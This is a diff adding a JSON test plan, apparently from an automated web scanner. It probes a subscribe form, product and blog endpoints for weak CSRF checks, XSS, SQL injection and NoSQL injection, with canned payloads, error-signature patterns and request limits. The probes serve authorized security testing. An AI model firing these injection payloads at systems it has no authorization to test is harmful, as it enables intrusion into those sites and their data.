@@ -1,0 +1,901 @@
+{
+  "test_cases": [
+    {
+      "id": "PLAN-1-CSRF-Validation",
+      "hypothesis_id": "H7",
+      "base_url": "https",
+      "method": "POST",
+      "endpoint": "14",
+      "parameter": "csrf",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": ""
+            }
+          ],
+          "description": "Missing CSRF token",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "invalidtoken"
+            }
+          ],
+          "description": "Invalid CSRF token",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "expect_rejection_without_valid_csrf",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              403
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Pre-check CSRF enforcement to decide whether to fetch/bind token for subsequent POST tests. Stop email-based attacks if CSRF strictly enforced with 403 for invalid/missing.",
+      "tags": [
+        "csrf",
+        "subscribe",
+        "gatekeeper"
+      ]
+    },
+    {
+      "id": "PLAN-2-Subscribe-XSS",
+      "hypothesis_id": "H5",
+      "base_url": "https",
+      "method": "POST",
+      "endpoint": "14",
+      "parameter": "email",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "mail@example.com"
+            }
+          ],
+          "description": "Baseline valid email",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "<img src=x onerror=alert(1)>@example.com"
+            }
+          ],
+          "description": "XSS probe in local-part of email",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "\"/><svg/onload=alert(1)>@example.com"
+            }
+          ],
+          "description": "Breaking out and injecting HTML/JS",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "Obtain CSRF token value from prior GET form/source",
+          "extract_from": "prior_response",
+          "bind_to": "csrf"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "observe_followup_gets",
+          "threshold": {
+            "string_value": "payload_appears_unencoded"
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline_followup",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "write_acceptance_vs_rejection",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201,
+              202,
+              400,
+              422
+            ]
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "notes": "Execute only if PLAN-1 indicates CSRF can be satisfied (token obtained) or is weak. Use same session for follow-up GETs to detect stored/reflected output.",
+      "tags": [
+        "xss_stored",
+        "subscribe",
+        "stateful_flow"
+      ]
+    },
+    {
+      "id": "PLAN-3-Subscribe-SQLi",
+      "hypothesis_id": "H6",
+      "base_url": "https",
+      "method": "POST",
+      "endpoint": "14",
+      "parameter": "email",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "mail@example.com"
+            }
+          ],
+          "description": "Baseline",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "mail@example.com'"
+            }
+          ],
+          "description": "Quote termination for SQLi",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "mail@example.com' OR 1=1 --"
+            }
+          ],
+          "description": "Boolean-based SQLi in email field",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "mail@example.com'); SELECT 1; --"
+            }
+          ],
+          "description": "Statement break attempt (should be handled safely by ORM)",
+          "encoding": "json",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "Obtain CSRF token value from prior GET form/source",
+          "extract_from": "prior_response",
+          "bind_to": "csrf"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201,
+              202,
+              400,
+              422,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "contains_db_error",
+          "threshold": {
+            "string_value": "SQL|mysql|postgres|sqlite|odbc|oracle|syntax error"
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "notes": "Run after PLAN-2 using same CSRF/token/session context. Abort remaining subscribe probes if server strictly rejects malformed inputs with consistent 422.",
+      "tags": [
+        "injection_sql",
+        "subscribe",
+        "stateful_flow"
+      ]
+    },
+    {
+      "id": "PLAN-4-Catalog-Product-SQLi",
+      "hypothesis_id": "H1",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "8",
+      "parameter": "productId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17"
+            },
+            {
+              "location": "query",
+              "value": "17'"
+            }
+          ],
+          "description": "Baseline and single-quote probe for SQL injection",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17 OR 1=1"
+            },
+            {
+              "location": "query",
+              "value": "17 AND 1=2"
+            }
+          ],
+          "description": "Boolean-based SQLi probes",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17) --"
+            },
+            {
+              "location": "query",
+              "value": "17' --"
+            }
+          ],
+          "description": "Comment termination patterns",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17 UNION SELECT 1"
+            }
+          ],
+          "description": "UNION-based SQLi light probe",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "contains_db_error",
+          "threshold": {
+            "string_value": "SQL|mysql|postgres|sqlite|odbc|oracle|syntax error"
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Run before NoSQL probes; if strong SQL error signatures detected, skip H2 for this endpoint.",
+      "tags": [
+        "injection_sql",
+        "catalog_product",
+        "high_confidence"
+      ]
+    },
+    {
+      "id": "PLAN-5-Catalog-Product-NoSQLi",
+      "hypothesis_id": "H2",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "8",
+      "parameter": "productId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17"
+            },
+            {
+              "location": "query",
+              "value": "{\"$ne\":null}"
+            }
+          ],
+          "description": "Baseline and basic NoSQL operator JSON string",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "17, \"$or\": [{}, {}]"
+            },
+            {
+              "location": "query",
+              "value": "17, \"$gt\": \"\""
+            }
+          ],
+          "description": "Operator injection variants in string context",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "[$ne]"
+            },
+            {
+              "location": "query",
+              "value": "null"
+            }
+          ],
+          "description": "Edge values for loose comparisons",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "contains_nosql_error",
+          "threshold": {
+            "string_value": "MongoError|BSON|Cast to ObjectId|Invalid $operator|NoSQL|TypeError"
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Execute only if PLAN-4 shows no SQL behavior, or responses hint at NoSQL stack. Stop early if 400 with validation message repeats.",
+      "tags": [
+        "injection_nosql",
+        "catalog_product"
+      ]
+    },
+    {
+      "id": "PLAN-6-Blog-Post-SQLi-Combined",
+      "hypothesis_id": "H3+H4",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "12",
+      "parameter": "postId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "3"
+            },
+            {
+              "location": "query",
+              "value": "3'"
+            }
+          ],
+          "description": "Baseline and quote probe (postId=3)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "3 OR 1=1"
+            },
+            {
+              "location": "query",
+              "value": "3 AND 1=2"
+            }
+          ],
+          "description": "Boolean-based SQLi (postId=3)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "3' --"
+            },
+            {
+              "location": "query",
+              "value": "3) --"
+            }
+          ],
+          "description": "Comment termination (postId=3)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "3 UNION SELECT 1"
+            }
+          ],
+          "description": "UNION probe (postId=3)",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "contains_db_error",
+          "threshold": {
+            "string_value": "SQL|mysql|postgres|sqlite|odbc|oracle|syntax error"
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "De-duplicated: test one representative blog endpoint first (postId=3). If vulnerable, skip testing postId=4 redundantly; otherwise clone payloads for endpoint 13.",
+      "tags": [
+        "injection_sql",
+        "blog_post",
+        "dedup"
+      ]
+    },
+    {
+      "id": "PLAN-7-Blog-Post-XSS-Combined",
+      "hypothesis_id": "H8+H9",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "12",
+      "parameter": "postId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "3"
+            }
+          ],
+          "description": "Baseline (postId=3)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "<svg/onload=alert(1)>"
+            }
+          ],
+          "description": "Basic reflected XSS payload (postId=3)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "\"/><img src=x onerror=alert(1)>"
+            }
+          ],
+          "description": "Attribute break-out XSS (postId=3)",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "direct_echo_unencoded",
+          "threshold": {
+            "string_value": "<svg/onload=alert(1)>"
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "rejects_malicious_inputs",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "If XSS indicators found at postId=3, skip testing postId=4. If clean, replicate same probes on endpoint 13.",
+      "tags": [
+        "xss_reflected",
+        "blog_post",
+        "dedup"
+      ]
+    },
+    {
+      "id": "PLAN-8-Blog-Post-SQLi-Fallback",
+      "hypothesis_id": "H4",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "13",
+      "parameter": "postId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "4"
+            },
+            {
+              "location": "query",
+              "value": "4'"
+            }
+          ],
+          "description": "Baseline and quote probe (postId=4)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "4 OR 1=1"
+            },
+            {
+              "location": "query",
+              "value": "4 AND 1=2"
+            }
+          ],
+          "description": "Boolean-based SQLi (postId=4)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "4' --"
+            },
+            {
+              "location": "query",
+              "value": "4) --"
+            }
+          ],
+          "description": "Comment termination (postId=4)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "4 UNION SELECT 1"
+            }
+          ],
+          "description": "UNION probe (postId=4)",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "compare_to_baseline",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "contains_db_error",
+          "threshold": {
+            "string_value": "SQL|mysql|postgres|sqlite|odbc|oracle|syntax error"
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Execute only if PLAN-6 shows no vulnerability or inconclusive results on postId=3.",
+      "tags": [
+        "injection_sql",
+        "blog_post",
+        "fallback"
+      ]
+    },
+    {
+      "id": "PLAN-9-Blog-Post-XSS-Fallback",
+      "hypothesis_id": "H9",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "13",
+      "parameter": "postId",
+      "payloads": [
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "4"
+            }
+          ],
+          "description": "Baseline (postId=4)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "<svg/onload=alert(1)>"
+            }
+          ],
+          "description": "Basic reflected XSS payload (postId=4)",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "\"/><img src=x onerror=alert(1)>"
+            }
+          ],
+          "description": "Attribute break-out XSS (postId=4)",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "direct_echo_unencoded",
+          "threshold": {
+            "string_value": "<svg/onload=alert(1)>"
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "delta_vs_baseline",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "rejects_malicious_inputs",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              422
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Execute only if PLAN-7 is clean or inconclusive.",
+      "tags": [
+        "xss_reflected",
+        "blog_post",
+        "fallback"
+      ]
+    }
+  ]
+}
